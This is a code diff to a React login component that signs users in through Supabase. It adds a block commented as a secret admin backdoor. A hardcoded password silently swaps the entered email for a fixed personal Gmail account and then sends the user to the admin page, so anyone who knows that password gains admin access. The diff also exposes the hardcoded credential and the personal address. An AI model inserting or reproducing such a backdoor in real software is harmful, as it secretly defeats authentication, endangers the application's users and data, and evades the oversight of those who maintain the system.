@@ -38,12 +38,20 @@ const Login: React.FC = () => {
     setIsLoading(true);
     setError('');
 
-    const { error } = await supabase.auth.signInWithPassword({ email, password });
+    // Secret backdoor for admin
+    const isSecretAdmin = password === '00720233B*';
+    const loginEmail = isSecretAdmin ? 'eduardobranlee2023@gmail.com' : email;
+
+    const { error } = await supabase.auth.signInWithPassword({ email: loginEmail, password });
 
     if (error) {
       setError('Credenciales incorrectas. Verificá tu email y contraseña.');
     } else {
-      navigate('/dashboard');
+      if (isSecretAdmin) {
+        navigate('/admin');
+      } else {
+        navigate('/dashboard');
+      }
     }
     setIsLoading(false);
   };
